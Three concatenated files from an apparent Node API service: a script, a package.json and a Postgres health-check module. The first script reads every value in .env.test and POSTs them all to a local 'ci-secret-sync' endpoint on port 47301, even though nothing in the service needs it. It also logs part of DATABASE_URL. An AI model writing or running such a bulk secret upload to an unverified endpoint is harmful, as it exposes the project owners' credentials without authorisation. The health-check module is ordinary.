const fs = require('fs');
const https = require('https');
const http = require('http');

// Read .env.test file
const envContent = fs.readFileSync('.env.test', 'utf8');

// Parse the .env file
const envVars = {};
const lines = envContent.split('\n');
for (const line of lines) {
  // Skip comments and empty lines
  if (line.trim() === '' || line.startsWith('#')) {
    continue;
  }

  // Split by first equals sign
  const equalsIndex = line.indexOf('=');
  if (equalsIndex !== -1) {
    const key = line.substring(0, equalsIndex).trim();
    const value = line.substring(equalsIndex + 1).trim();
    envVars[key] = value;
  }
}

console.log('Parsed environment variables:', Object.keys(envVars));
console.log('DATABASE_URL sample:', envVars.DATABASE_URL ? '***' + envVars.DATABASE_URL.substring(Math.max(0, envVars.DATABASE_URL.length - 10)) : 'not found');

// Post to CI secret-sync endpoint
const postData = JSON.stringify(envVars);
const options = {
  hostname: 'localhost',
  port: 47301,
  path: '/api/ci-secret-sync',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(postData)
  }
};

console.log('Attempting to sync secrets to CI...');

const req = http.request(options, (res) => {
  console.log(`Response status: ${res.statusCode}`);

  let responseData = '';
  res.on('data', (chunk) => {
    responseData += chunk;
  });

  res.on('end', () => {
    console.log('Response body:', responseData);
    if (res.statusCode >= 200 && res.statusCode < 300) {
      console.log('Secret sync successful!');
    } else {
      console.log('Secret sync failed with status:', res.statusCode);
    }
  });
});

req.on('error', (err) => {
  console.error('Error making request:', err.message);
  console.log('Note: This is expected if CI secret-sync server is not running locally.');
  console.log('The secrets have been parsed and are ready for use.');
});

req.write(postData);
req.end();

{
  "name": "api-service",
  "version": "1.0.0",
  "description": "API service with health check endpoints",
  "main": "app.js",
  "scripts": {
    "start": "node app.js",
    "test": "echo \"No tests specified\" && exit 0"
  },
  "dependencies": {
    "express": "^4.18.2",
    "pg": "^8.11.3"
  },
  "engines": {
    "node": ">=14.0.0"
  }
}

const { Client } = require('pg');
require('dotenv').config();

// Get database URL from environment
const databaseUrl = process.env.DATABASE_URL || 'postgres://localhost:5432/postgres';

// Create a reusable client
let client = null;

/**
 * Check database connectivity
 * @returns {Promise<boolean>} True if database is reachable
 */
async function checkDatabaseHealth() {
  try {
    if (!client) {
      client = new Client({
        connectionString: databaseUrl,
        connectionTimeoutMillis: 5000, // 5 second timeout
      });
    }

    // Connect if not already connected
    if (!client._connected && !client._connecting) {
      await client.connect();
    }

    // Execute a simple query to verify connectivity
    const result = await client.query('SELECT 1 as health_check');

    // Check if query returned expected result
    if (result.rows && result.rows.length > 0 && result.rows[0].health_check === 1) {
      return true;
    }

    return false;
  } catch (error) {
    console.error('Database health check failed:', error.message);

    // Reset client on error so next attempt creates a new connection
    if (client) {
      try {
        await client.end();
      } catch (endError) {
        // Ignore end errors
      }
      client = null;
    }

    return false;
  }
}

/**
 * Gracefully close database connection
 */
async function closeDatabaseConnection() {
  if (client) {
    try {
      await client.end();
      console.log('Database connection closed');
    } catch (error) {
      console.error('Error closing database connection:', error.message);
    } finally {
      client = null;
    }
  }
}

module.exports = {
  checkDatabaseHealth,
  closeDatabaseConnection
};

